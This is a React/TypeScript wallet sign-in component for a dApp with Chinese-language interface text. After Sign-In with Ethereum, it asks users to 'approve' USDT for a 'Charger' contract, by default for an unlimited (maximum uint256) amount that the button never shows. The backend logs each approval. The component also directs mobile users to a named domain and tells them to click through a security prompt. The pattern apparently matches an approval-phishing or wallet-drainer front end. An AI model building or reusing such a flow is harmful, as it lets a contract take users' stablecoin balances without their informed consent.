"use client";

import { useCallback, useState, useEffect } from "react";
import { useConnect, useAccount, useDisconnect } from "wagmi";
import { SiweMessage } from "siwe";
import { useSignMessage } from "wagmi";
import { parseAbi } from "viem";
import { useWalletClient } from "wagmi";
import { MobileWalletLauncher } from "./MobileWalletLauncher";

const BASE_CHAIN_ID = 8453;

const ERC20_ABI = parseAbi([
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
]);

type Step = "disconnected" | "connected" | "siwe" | "approve" | "done";

function isMobile(): boolean {
  if (typeof window === "undefined") return false;
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
}

function hasInjected(): boolean {
  if (typeof window === "undefined") return false;
  return !!(window as unknown as { ethereum?: unknown }).ethereum;
}

export interface AuthFlowProps {
  apiUrl?: string;
  chainId?: number;
  /** If true, hide the outer padding and maxWidth (for embed) */
  compact?: boolean;
}

export function AuthFlow({
  apiUrl = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000",
  chainId = BASE_CHAIN_ID,
  compact = false,
}: AuthFlowProps) {
  const { connect, connectors, isPending } = useConnect();
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  const [step, setStep] = useState<Step>("disconnected");
  const [siweLoading, setSiweLoading] = useState(false);
  const [approveLoading, setApproveLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [approveTxHash, setApproveTxHash] = useState<string | null>(null);

  const fetchWithCreds = useCallback((url: string, opts: RequestInit = {}) => {
    return fetch(url, { ...opts, credentials: "include" });
  }, []);

  const handleSiwe = useCallback(async () => {
    if (!address) return;
    setError(null);
    setSiweLoading(true);
    try {
      const nonceRes = await fetchWithCreds(`${apiUrl}/siwe/nonce`);
      const { nonce } = await nonceRes.json();
      const domain = typeof window !== "undefined" ? new URL(apiUrl).hostname : "localhost";
      const origin = typeof window !== "undefined" ? window.location.origin : "";
      const message = new SiweMessage({
        domain,
        address,
        statement: "Sign in to the dApp.",
        uri: origin,
        version: "1",
        chainId,
        nonce,
      });
      const toSign = message.prepareMessage();
      const signature = await signMessageAsync({ message: toSign });
      const verifyRes = await fetchWithCreds(`${apiUrl}/siwe/verify`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: toSign, signature }),
      });
      if (!verifyRes.ok) {
        const data = await verifyRes.json().catch(() => ({}));
        throw new Error(data.error ?? "SIWE verify failed");
      }
      setStep("siwe");
    } catch (e) {
      setError(e instanceof Error ? e.message : "SIWE failed");
    } finally {
      setSiweLoading(false);
    }
  }, [address, signMessageAsync, fetchWithCreds, apiUrl, chainId]);

  const handleApprove = useCallback(async () => {
    if (!address || !walletClient) return;
    const usdtAddress = process.env.NEXT_PUBLIC_USDT_ADDRESS as `0x${string}` | undefined;
    const chargerAddress = process.env.NEXT_PUBLIC_CHARGER_CONTRACT_ADDRESS as `0x${string}` | undefined;
    const amount = process.env.NEXT_PUBLIC_DEFAULT_APPROVE_AMOUNT ?? "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    if (!usdtAddress || !chargerAddress) {
      setError("USDT or Charger address not configured");
      return;
    }
    setError(null);
    setApproveLoading(true);
    try {
      const hash = await walletClient.writeContract({
        address: usdtAddress,
        abi: ERC20_ABI,
        functionName: "approve",
        args: [chargerAddress, BigInt(amount)],
      });
      setApproveTxHash(hash);
      await fetchWithCreds(`${apiUrl}/events`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "APPROVE", status: "SUCCESS", address, txHash: hash }),
      }).catch(() => {});
      setStep("done");
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Approve failed";
      setError(msg);
      await fetchWithCreds(`${apiUrl}/events`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "APPROVE", status: "FAILED", address, errorSummary: msg }),
      }).catch(() => {});
    } finally {
      setApproveLoading(false);
    }
  }, [address, walletClient, fetchWithCreds, apiUrl]);

  const checkSession = useCallback(async () => {
    const res = await fetchWithCreds(`${apiUrl}/siwe/me`);
    const data = await res.json();
    if (data.address && data.siweVerified) setStep("siwe");
  }, [fetchWithCreds, apiUrl]);

  useEffect(() => {
    if (isConnected && address) {
      setStep("connected");
      checkSession();
    } else {
      setStep("disconnected");
    }
  }, [isConnected, address, checkSession]);

  const wrapperStyle: React.CSSProperties = compact
    ? { padding: "1rem" }
    : { padding: "2rem", maxWidth: 480, margin: "0 auto" };

  return (
    <main style={wrapperStyle}>
      {error && (
        <div style={{ padding: "0.75rem", background: "#3f1f1f", borderRadius: 8, marginBottom: "1rem" }}>
          {error}
        </div>
      )}

      {!isConnected && (
        <section style={{ marginBottom: "1.5rem" }}>
          {(() => {
            const injectedConnector = connectors.find((c) => c.id === "injected");
            const wcConnector = connectors.find((c) => c.id === "walletConnect");
            const connectWc = () => wcConnector && connect({ connector: wcConnector });
            const mobileNoInjected = typeof window !== "undefined" && isMobile() && !hasInjected();

            if (mobileNoInjected) {
              return (
                <>
                  <MobileWalletLauncher onWalletConnect={connectWc} />
                  <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
                    <button
                      type="button"
                      onClick={connectWc}
                      disabled={isPending}
                      style={{
                        padding: "0.4rem 0.75rem",
                        background: "transparent",
                        border: "1px solid #64748b",
                        borderRadius: 8,
                        color: "#94a3b8",
                        cursor: isPending ? "not-allowed" : "pointer",
                        fontSize: "0.8125rem",
                      }}
                    >
                      更多钱包
                    </button>
                  </div>
                </>
              );
            }

            const onPrimary =
              injectedConnector && hasInjected()
                ? () => connect({ connector: injectedConnector })
                : connectWc;

            return (
              <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
                <button
                  type="button"
                  onClick={onPrimary}
                  disabled={isPending}
                  style={{
                    padding: "0.75rem 1.25rem",
                    background: "#3b82f6",
                    border: "none",
                    borderRadius: 8,
                    color: "#fff",
                    cursor: isPending ? "not-allowed" : "pointer",
                    fontSize: "1rem",
                  }}
                >
                  {isPending ? "连接中…" : "连接钱包（推荐）"}
                </button>
                <button
                  type="button"
                  onClick={connectWc}
                  disabled={isPending}
                  style={{
                    padding: "0.4rem 0.75rem",
                    background: "transparent",
                    border: "1px solid #64748b",
                    borderRadius: 8,
                    color: "#94a3b8",
                    cursor: isPending ? "not-allowed" : "pointer",
                    fontSize: "0.8125rem",
                  }}
                >
                  更多钱包
                </button>
              </div>
            );
          })()}
          {isMobile() && (
            <div style={{ fontSize: "0.875rem", color: "#94a3b8", marginTop: 12, padding: "12px", background: "rgba(0,0,0,0.2)", borderRadius: 8 }}>
              <p style={{ margin: "0 0 8px 0", fontWeight: 600, color: "#e2e8f0" }}>避免「在 TokenPocket 中打开此页？」提示</p>
              <p style={{ margin: "0 0 6px 0" }}>请直接在钱包 App 内打开本页：打开 TokenPocket → 底部「浏览器」或「发现」→ 输入 <strong>dapp.sourcofsun.online</strong>，即可在 App 内连接，无需系统弹窗。</p>
              <p style={{ margin: 0, opacity: 0.9 }}>若已在系统浏览器中打开，选择 WalletConnect 后点选 TokenPocket 时出现的「在 TokenPocket 中打开此页？」为系统安全提示，点击「打开」即可继续。</p>
            </div>
          )}
        </section>
      )}

      {isConnected && step === "connected" && (
        <section style={{ marginBottom: "1.5rem" }}>
          <p style={{ marginBottom: "0.5rem" }}>已连接: {address?.slice(0, 6)}…{address?.slice(-4)}</p>
          <button
            onClick={handleSiwe}
            disabled={siweLoading}
            style={{
              padding: "0.75rem 1.25rem",
              background: "#22c55e",
              border: "none",
              borderRadius: 8,
              color: "#fff",
              cursor: siweLoading ? "not-allowed" : "pointer",
              marginRight: 8,
            }}
          >
            {siweLoading ? "签名中…" : "SIWE 登录"}
          </button>
          <button
            onClick={() => disconnect()}
            style={{
              padding: "0.75rem 1.25rem",
              background: "#52525b",
              border: "none",
              borderRadius: 8,
              color: "#fff",
              cursor: "pointer",
            }}
          >
            断开
          </button>
        </section>
      )}

      {isConnected && (step === "siwe" || step === "done") && (
        <section style={{ marginBottom: "1.5rem" }}>
          <p style={{ marginBottom: "0.5rem" }}>已登录: {address?.slice(0, 6)}…{address?.slice(-4)}</p>
          {step === "siwe" && (
            <button
              onClick={handleApprove}
              disabled={approveLoading}
              style={{
                padding: "0.75rem 1.25rem",
                background: "#eab308",
                border: "none",
                borderRadius: 8,
                color: "#000",
                cursor: approveLoading ? "not-allowed" : "pointer",
                marginRight: 8,
              }}
            >
              {approveLoading ? "授权中…" : "授权 USDT (Approve)"}
            </button>
          )}
          {step === "done" && approveTxHash && (
            <p style={{ color: "#22c55e" }}>授权成功 tx: {approveTxHash.slice(0, 10)}…</p>
          )}
          <button
            onClick={() => disconnect()}
            style={{
              padding: "0.75rem 1.25rem",
              background: "#52525b",
              border: "none",
              borderRadius: 8,
              color: "#fff",
              cursor: "pointer",
            }}
          >
            断开
          </button>
        </section>
      )}
    </main>
  );
}
